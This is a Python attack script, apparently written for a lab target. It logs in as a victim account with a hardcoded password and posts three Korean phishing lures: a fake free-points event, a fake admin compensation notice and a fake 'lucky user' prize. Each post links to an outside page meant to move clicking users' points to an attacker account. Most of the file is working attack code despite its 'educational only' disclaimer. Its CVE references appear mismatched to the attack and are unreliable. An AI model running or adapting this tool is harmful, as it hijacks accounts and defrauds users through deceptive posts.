"""
🎯 Malicious Post Creation Attack Tool (Social Engineering)
========================================================

⚠️  SECURITY ANALYSIS & CVE INFORMATION ⚠️
===========================================

🎯 Attack Type: Social Engineering via Malicious Posts
📊 Risk Level: HIGH (CVSS 3.1: 8.2)
🔍 CVE References:
   - CVE-2022-25765 (Social Engineering via Web Content)
   - CVE-2021-44228 (Social Engineering + Session Management)
   - CVE-2020-13379 (Malicious Link Injection in Posts)
   - CVE-2019-17596 (User-Generated Content XSS)
   - CVE-2018-6341 (Phishing via Platform Content)

🚨 VULNERABILITY ASSESSMENT:
============================
CVSS 3.1 Vector: AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
- Attack Vector: Network (웹 기반 소셜 엔지니어링)
- Attack Complexity: Low (간단한 피싱 링크)
- Privileges Required: Low (일반 사용자 권한)
- User Interaction: Required (링크 클릭 필요)
- Scope: Changed (다른 사용자에게 영향)
- Confidentiality: High (계정 정보 노출)
- Integrity: High (포인트 데이터 변조)
- Availability: None (가용성 영향 없음)

📈 Base Score: 8.2 (HIGH RISK)

⚡ ATTACK MECHANISM:
====================
1. 공격자가 피해자 계정으로 로그인 (bob)
2. 매력적인 무료 포인트 이벤트 게시글 작성
3. 악성 링크를 포함한 소셜 엔지니어링 콘텐츠 업로드
4. 다른 사용자들이 링크 클릭 시 자동 포인트 전송
5. 대량의 사용자를 대상으로 한 자동화된 포인트 탈취

🛡️  COUNTERMEASURES:
====================
1. Content Security Policy (CSP) Implementation
2. User-Generated Content Filtering
3. Suspicious Link Detection
4. User Education on Phishing
5. External Link Warning System

⚖️  LEGAL WARNING:
==================
이 도구는 오직 교육 및 승인된 보안 테스트 목적으로만 사용되어야 합니다.
"""

import requests
from bs4 import BeautifulSoup
import time
import os
import json
from datetime import datetime
import random


class MaliciousPostAttacker:
    """악성 게시글 작성을 통한 소셜 엔지니어링 공격 도구"""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.hacker_id = "13"
        self.bob_username = 'bob'
        self.bob_password = 'bobby123'
        self.malicious_link = 'https://heo-ye-eun.github.io/event/'

        # 보안 분석 정보
        self.vulnerability_info = {
            "attack_type": "Social Engineering via Malicious Posts",
            "cvss_score": 8.2,
            "risk_level": "HIGH",
            "cve_references": [
                "CVE-2022-25765", "CVE-2021-44228", "CVE-2020-13379",
                "CVE-2019-17596", "CVE-2018-6341"
            ],
            "impact_areas": ["Social Engineering", "Phishing", "Mass User Targeting"]
        }

        # 프록시 설정
        original_proxy = os.environ.get('ALL_PROXY')
        self.proxy_config = {}
        if original_proxy:
            self.proxy_config = {
                'http': original_proxy,
                'https': original_proxy
            }
            print(f"[+] 프록시 사용: {original_proxy}")

        # 세션 설정
        self.session = requests.Session()
        self.session.proxies.update(self.proxy_config)
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3'
        })
        self.session.timeout = 30

        # 공격 통계
        self.attack_stats = {
            "start_time": datetime.now(),
            "login_attempts": 0,
            "post_attempts": 0,
            "successful_posts": 0,
            "malicious_content": [],
            "server_responses": []
        }

    def print_attack_banner(self):
        """공격 배너 출력"""
        print("🎣" * 25)
        print("   MALICIOUS POST CREATION ATTACK")
        print("🎣" * 25)
        print(f"🎯 Target: {self.base_url}")
        print(f"👤 Victim Account: {self.bob_username}")
        print(f"🏴‍☠️ Beneficiary: hacker (ID: {self.hacker_id})")
        print(f"🔗 Malicious Link: {self.malicious_link}")
        print(f"⚡ CVSS Score: {self.vulnerability_info['cvss_score']} (HIGH)")
        print("🎣" * 25)

    def login_as_bob(self):
        """Bob 계정으로 로그인"""
        print("\n[PHASE 1] 🔓 Victim Account Login")
        print("=" * 35)

        self.attack_stats["login_attempts"] += 1

        login_data = {
            'username': self.bob_username,
            'password': self.bob_password
        }

        for attempt in range(3):
            try:
                print(f"[ATTEMPT {attempt + 1}] Bob 계정 로그인 시도...")

                response = self.session.post(f"{self.base_url}/login.php",
                                             data=login_data, timeout=30)

                if any(indicator in response.text.lower()
                       for indicator in ['logout', 'profile', 'points', 'bob']):
                    print(f"✅ Bob 로그인 성공!")
                    return True
                else:
                    print(f"❌ 로그인 실패 (시도 {attempt + 1})")

            except Exception as e:
                print(f"❌ 로그인 오류 (시도 {attempt + 1}): {e}")
                if attempt < 2:
                    time.sleep(3)

        return False

    def analyze_post_form(self):
        """게시글 작성 폼 분석"""
        print("\n[ANALYZE] 게시글 작성 폼 분석 중...")

        try:
            response = self.session.get(f"{self.base_url}/new_post.php", timeout=20)

            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')

                for form in forms:
                    form_data = {}
                    inputs = form.find_all(['input', 'textarea', 'select'])

                    for inp in inputs:
                        name = inp.get('name', '')
                        input_type = inp.get('type', 'text')
                        value = inp.get('value', '')

                        if name:
                            if input_type == 'hidden':
                                form_data[name] = value
                            elif name.lower() in ['content', 'message', 'text', 'post', 'body']:
                                form_data[name] = 'PLACEHOLDER_CONTENT'
                            elif input_type == 'submit' and value:
                                form_data[name] = value

                    if form_data:
                        print(f"✅ 폼 데이터 추출 성공: {list(form_data.keys())}")
                        return form_data

            # 기본 폼 데이터
            return {'content': 'PLACEHOLDER_CONTENT'}

        except Exception as e:
            print(f"❌ 폼 분석 오류: {e}")
            return {'content': 'PLACEHOLDER_CONTENT'}

    def create_malicious_posts(self, form_data):
        """악성 게시글 작성"""
        print("\n[PHASE 2] 🎣 Creating Malicious Posts")
        print("=" * 40)

        # 소셜 엔지니어링 게시글 템플릿
        malicious_templates = [
            f'''🎁 긴급! 무료 포인트 대방출 이벤트! 🎁

🌟 오늘만 특별 혜택! 선착순 100명!

🎯 무료 포인트 받는 방법:
👆 <a href="{self.malicious_link}" target="_blank">
   ⭐ 여기 클릭하면 즉시 100P 지급! ⭐
</a>

✨ 로그인만 하면 자동으로 포인트가 들어와요!
⏰ 한정 시간 이벤트니까 서둘러 받으세요!
💎 보너스 다이아까지 추가 증정!

⚠️ 로그인이 필요한 경우 다시 로그인 후 링크 재클릭!''',

            f'''🚨 시스템 점검 보상 지급 안내 🚨

안녕하세요! 관리자입니다.

📢 긴급 공지: 서버 점검으로 인한 보상 지급
🔧 점검 시간: 오늘 오후 2시~4시
💰 보상 내용: 포인트 200P + 다이아 50개

🎯 보상 받기:
<a href="{self.malicious_link}">
🔗 보상 지급 페이지 (클릭)
</a>

⭐ 자동으로 계정에 지급되니 안심하세요!
📝 별도 신청 없이 링크 클릭만 하면 완료!''',

            f'''🎉 축하합니다! 럭키 유저 선정! 🎉

🍀 당신이 오늘의 럭키 유저로 선정되었습니다!

🏆 럭키 유저 혜택:
• 포인트 500P 즉시 지급
• 프리미엄 아이템 무료 증정  
• VIP 등급 1개월 무료

🎁 혜택 받기:
<a href="{self.malicious_link}" style="color: red; font-weight: bold;">
🌟 럭키 유저 혜택 받기 (클릭!) 🌟
</a>

⏳ 24시간 내에 클릭해야 유효합니다!
🎊 이런 기회는 다시 오지 않아요!'''
        ]

        successful_posts = 0

        for i, template in enumerate(malicious_templates, 1):
            self.attack_stats["post_attempts"] += 1

            print(f"\n[POST {i}] 악성 게시글 작성 중...")

            post_result = {
                "post_number": i,
                "timestamp": datetime.now().isoformat(),
                "content_preview": template[:100] + "...",
                "success": False,
                "response_code": 0,
                "error_message": ""
            }

            try:
                post_data = form_data.copy()

                # 콘텐츠 필드 설정
                content_fields = ['content', 'message', 'text', 'post', 'body']
                for field in content_fields:
                    if field in post_data:
                        post_data[field] = template
                        break
                else:
                    post_data['content'] = template

                response = self.session.post(
                    f"{self.base_url}/new_post.php",
                    data=post_data,
                    timeout=25,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )

                post_result["response_code"] = response.status_code

                # 성공 판정
                success_indicators = [
                    "post", "success", "작성", "등록", "index.php",
                    response.url.endswith('/'), "게시글"
                ]

                response_text = response.text.lower()

                if (response.status_code in [200, 302] and
                        any(indicator in response_text or indicator in response.url.lower()
                            for indicator in success_indicators)):

                    print(f"    ✅ 악성 게시글 {i} 업로드 성공!")
                    successful_posts += 1
                    self.attack_stats["successful_posts"] += 1
                    post_result["success"] = True
                else:
                    print(f"    ❌ 게시글 {i} 업로드 실패")
                    post_result["error_message"] = "Upload failed - no success indicators"

            except Exception as e:
                print(f"    ❌ 게시글 {i} 오류: {e}")
                post_result["error_message"] = str(e)

            # 게시글 결과 저장
            self.attack_stats["malicious_content"].append(post_result)
            time.sleep(random.uniform(2, 4))

        return successful_posts

    def generate_attack_report(self, successful_posts):
        """공격 결과 리포트 생성 (Shell + JSON + HTML)"""
        print("\n[PHASE 3] 📊 Social Engineering Attack Analysis")
        print("=" * 55)

        end_time = datetime.now()
        duration = end_time - self.attack_stats["start_time"]
        success_rate = (successful_posts / self.attack_stats["post_attempts"]) * 100 if self.attack_stats[
                                                                                            "post_attempts"] > 0 else 0

        # ========== 1. SHELL 리포트 ==========
        print(f"\n🎣 SOCIAL ENGINEERING ATTACK RESULTS")
        print("=" * 50)

        print(f"⏱️ Attack Duration: {duration.total_seconds():.1f} seconds")
        print(f"🎯 Login Success: {self.attack_stats['login_attempts']}/1 attempts")
        print(f"📝 Post Creation Attempts: {self.attack_stats['post_attempts']}")
        print(f"✅ Successful Malicious Posts: {successful_posts}")
        print(f"📈 Success Rate: {success_rate:.1f}%")

        if successful_posts > 0:
            print(f"🚨 ATTACK STATUS: SUCCESSFUL")
            print(f"🎯 Social Engineering Impact: High-risk phishing content deployed")
            print(f"🔗 Malicious Link: {self.malicious_link}")

            print(f"\n🔍 Security Analysis:")
            print(f"   • Attack Type: {self.vulnerability_info['attack_type']}")
            print(f"   • CVSS Score: {self.vulnerability_info['cvss_score']} (HIGH)")
            print(f"   • Related CVEs: {', '.join(self.vulnerability_info['cve_references'][:3])}")

            print(f"\n🛡️ Security Recommendations:")
            recommendations = [
                "Implement content filtering for suspicious links",
                "Add external link warning system",
                "Deploy user education on phishing recognition",
                "Monitor user-generated content for malicious patterns",
                "Implement Content Security Policy (CSP)"
            ]
            for i, rec in enumerate(recommendations, 1):
                print(f"   {i}. {rec}")
        else:
            print(f"🛡️ ATTACK STATUS: FAILED")
            print(f"✅ Platform appears protected against malicious content")

        # ========== 2. JSON 리포트 ==========
        print(f"\n📄 Generating JSON Report...")

        json_report = {
            "report_metadata": {
                "report_type": "Social Engineering via Malicious Posts",
                "generated_at": end_time.isoformat(),
                "tool_version": "1.0"
            },
            "target_information": {
                "application_url": self.base_url,
                "victim_account": self.bob_username,
                "malicious_link": self.malicious_link,
                "beneficiary_id": self.hacker_id
            },
            "vulnerability_analysis": {
                "attack_type": self.vulnerability_info['attack_type'],
                "cvss_score": self.vulnerability_info['cvss_score'],
                "risk_level": self.vulnerability_info['risk_level'],
                "cve_references": self.vulnerability_info['cve_references'],
                "impact_areas": self.vulnerability_info['impact_areas']
            },
            "attack_statistics": {
                "start_time": self.attack_stats['start_time'].isoformat(),
                "end_time": end_time.isoformat(),
                "duration_seconds": duration.total_seconds(),
                "login_attempts": self.attack_stats['login_attempts'],
                "post_attempts": self.attack_stats['post_attempts'],
                "successful_posts": successful_posts,
                "success_rate_percent": success_rate
            },
            "malicious_content": self.attack_stats['malicious_content'],
            "risk_assessment": {
                "is_vulnerable": successful_posts > 0,
                "risk_score": self.vulnerability_info['cvss_score'],
                "social_engineering_success": successful_posts > 0
            },
            "recommendations": [
                "Implement content filtering for suspicious links",
                "Add external link warning system",
                "Deploy user education on phishing recognition",
                "Monitor user-generated content for malicious patterns",
                "Implement Content Security Policy (CSP)",
                "Add link reputation checking",
                "Implement user report system for suspicious content"
            ]
        }

        json_filename = f"malicious_post_report_{int(time.time())}.json"
        with open(json_filename, 'w', encoding='utf-8') as f:
            json.dump(json_report, f, indent=2, ensure_ascii=False, default=str)

        print(f"✅ JSON Report saved: {json_filename}")

        # ========== 3. HTML 리포트 ==========
        print(f"📄 Generating HTML Report...")

        if successful_posts > 0:
            risk_color = "#dc3545"
            status_text = "VULNERABLE"
            status_icon = "⚠️"
        else:
            risk_color = "#28a745"
            status_text = "PROTECTED"
            status_icon = "🛡️"

        html_content = f"""<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Engineering Attack Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
        .header {{ background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white; padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .content {{ padding: 30px; }}
        .status-banner {{ background: {risk_color}; color: white; padding: 20px; border-radius: 8px; text-align: center; font-size: 1.5em; margin: 20px 0; }}
        .section {{ margin: 20px 0; padding: 20px; background: #f8f9fa; border-radius: 8px; border-left: 5px solid #ff6b6b; }}
        .section h2 {{ margin-top: 0; color: #ff6b6b; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
        .stat-card {{ background: white; padding: 20px; border-radius: 8px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .stat-value {{ font-size: 2em; font-weight: bold; color: #ff6b6b; }}
        .stat-label {{ color: #666; margin-top: 5px; }}
        .malicious-link {{ background: #fff3cd; padding: 15px; border-radius: 8px; border: 2px solid #ffc107; margin: 15px 0; }}
        .malicious-link code {{ background: #f8d7da; padding: 5px; border-radius: 3px; font-family: monospace; }}
        .post-list {{ margin: 15px 0; }}
        .post-item {{ background: white; margin: 10px 0; padding: 15px; border-radius: 8px; border-left: 5px solid #28a745; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
        .post-item.failed {{ border-left-color: #dc3545; }}
        .cve-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; }}
        .cve-item {{ background: #e9ecef; padding: 10px; border-radius: 5px; text-align: center; font-family: monospace; }}
        .rec-list {{ counter-reset: rec-counter; }}
        .rec-item {{ counter-increment: rec-counter; background: white; margin: 10px 0; padding: 15px; border-radius: 8px; border-left: 5px solid #17a2b8; }}
        .rec-item::before {{ content: counter(rec-counter) ". "; font-weight: bold; color: #17a2b8; }}
        .footer {{ background: #343a40; color: white; padding: 20px; text-align: center; border-radius: 0 0 10px 10px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎣 Social Engineering Report</h1>
            <p>Malicious Post Creation Attack Analysis</p>
            <p>Generated: {end_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>

        <div class="content">
            <div class="status-banner">
                {status_icon} PLATFORM STATUS: {status_text}
            </div>

            <div class="section">
                <h2>📊 Attack Statistics</h2>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">{self.attack_stats['post_attempts']}</div>
                        <div class="stat-label">Posts Attempted</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{successful_posts}</div>
                        <div class="stat-label">Successful Posts</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{success_rate:.1f}%</div>
                        <div class="stat-label">Success Rate</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{duration.total_seconds():.1f}s</div>
                        <div class="stat-label">Attack Duration</div>
                    </div>
                </div>
            </div>

            <div class="section">
                <h2>🎯 Attack Information</h2>
                <p><strong>Target Platform:</strong> {self.base_url}</p>
                <p><strong>Victim Account:</strong> {self.bob_username}</p>
                <p><strong>Attack Method:</strong> Social Engineering via Malicious Posts</p>

                <div class="malicious-link">
                    <strong>🚨 Malicious Link Deployed:</strong><br>
                    <code>{self.malicious_link}</code><br>
                    <small>⚠️ This link was embedded in {successful_posts} malicious posts</small>
                </div>
            </div>

            <div class="section">
                <h2>🔍 Vulnerability Analysis</h2>
                <p><strong>Attack Type:</strong> {self.vulnerability_info['attack_type']}</p>
                <p><strong>CVSS 3.1 Score:</strong> {self.vulnerability_info['cvss_score']} ({self.vulnerability_info['risk_level']})</p>
                <p><strong>Related CVEs:</strong></p>
                <div class="cve-grid">"""

        for cve in self.vulnerability_info['cve_references']:
            html_content += f'<div class="cve-item">{cve}</div>'

        html_content += f"""</div>
            </div>

            <div class="section">
                <h2>📝 Malicious Posts Analysis</h2>
                <div class="post-list">"""

        for post in self.attack_stats['malicious_content']:
            status_class = "" if post['success'] else "failed"
            status_text = "✅ SUCCESS" if post['success'] else "❌ FAILED"
            html_content += f"""
                    <div class="post-item {status_class}">
                        <strong>Post {post['post_number']} - {status_text}</strong><br>
                        <small>Content: {post['content_preview']}</small><br>
                        <small>Response Code: {post['response_code']}</small>
                        {f"<br><small>Error: {post['error_message']}</small>" if post['error_message'] else ""}
                    </div>"""

        html_content += f"""
                </div>
            </div>

            <div class="section">
                <h2>🛡️ Security Recommendations</h2>
                <div class="rec-list">
                    <div class="rec-item">Implement content filtering for suspicious links</div>
                    <div class="rec-item">Add external link warning system</div>
                    <div class="rec-item">Deploy user education on phishing recognition</div>
                    <div class="rec-item">Monitor user-generated content for malicious patterns</div>
                    <div class="rec-item">Implement Content Security Policy (CSP)</div>
                    <div class="rec-item">Add link reputation checking system</div>
                    <div class="rec-item">Implement user report system for suspicious content</div>
                </div>
            </div>
        </div>

        <div class="footer">
            <p>🔒 Social Engineering Assessment Tool | Educational Purpose Only</p>
            <p>Report generated at {end_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
    </div>
</body>
</html>"""

        html_filename = f"malicious_post_report_{int(time.time())}.html"
        with open(html_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"✅ HTML Report saved: {html_filename}")

        # ========== 4. 리포트 완료 ==========
        print(f"\n📁 All reports generated successfully:")
        print(f"   • Shell Output: ✅ Displayed above")
        print(f"   • JSON Report: ✅ {json_filename}")
        print(f"   • HTML Report: ✅ {html_filename}")

        return successful_posts > 0

    def run_social_engineering_attack(self):
        """소셜 엔지니어링 공격 실행"""
        try:
            # 1. 공격 배너
            self.print_attack_banner()

            # 2. Bob 로그인
            if not self.login_as_bob():
                print("\n❌ Attack failed - cannot login as victim")
                return False

            # 3. 폼 분석
            form_data = self.analyze_post_form()

            # 4. 악성 게시글 작성
            successful_posts = self.create_malicious_posts(form_data)

            # 5. 로그아웃
            print("\n[CLEANUP] Bob 계정 로그아웃...")
            try:
                self.session.get(f"{self.base_url}/logout.php", timeout=10)
                self.session.cookies.clear()
                print("✅ Bob 로그아웃 완료")
            except:
                print("⚠️ 로그아웃 오류 (세션 클리어됨)")

            # 6. 결과 분석 및 리포트
            attack_success = self.generate_attack_report(successful_posts)

            # 7. 최종 결과
            print(f"\n🏆 FINAL ATTACK RESULT")
            print("=" * 30)

            if attack_success:
                print("🚨 SOCIAL ENGINEERING ATTACK SUCCESSFUL!")
                print(f"🎣 {successful_posts} malicious posts deployed successfully!")
                print(f"🔗 Phishing link active: {self.malicious_link}")
                print(f"⚠️ Users clicking the link will transfer points to hacker!")
            else:
                print("🛡️ Social engineering attack failed or blocked")
                print("✅ Platform may have content filtering protections")

            return attack_success

        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
            return False
        except Exception as e:
            print(f"❌ Attack sequence failed: {e}")
            import traceback
            traceback.print_exc()
            return False


if __name__ == "__main__":
    import sys

    print(__doc__)  # 보안 분석 정보 출력

    if len(sys.argv) < 2:
        print("Usage: python3 malicious_post_attack.py <target_url>")
        print("Example: python3 malicious_post_attack.py http://3.35.218.180/")
        sys.exit(1)

    target = sys.argv[1]

    print("🚀 Social Engineering Attack Starting...")
    print(f"🎯 Target: {target}")
    print("⚖️ Legal Notice: Educational and authorized testing only!")

    # 소셜 엔지니어링 공격 실행
    attacker = MaliciousPostAttacker(target)
    success = attacker.run_social_engineering_attack()

    if success:
        print("\n✅ Social engineering attack completed successfully!")
        print("🎣 Malicious posts are now live - users may fall victim to phishing!")
        print("🔍 Check the generated HTML report for detailed analysis.")
    else:
        print("\n❌ Social engineering attack was unsuccessful.")

    sys.exit(0 if success else 1)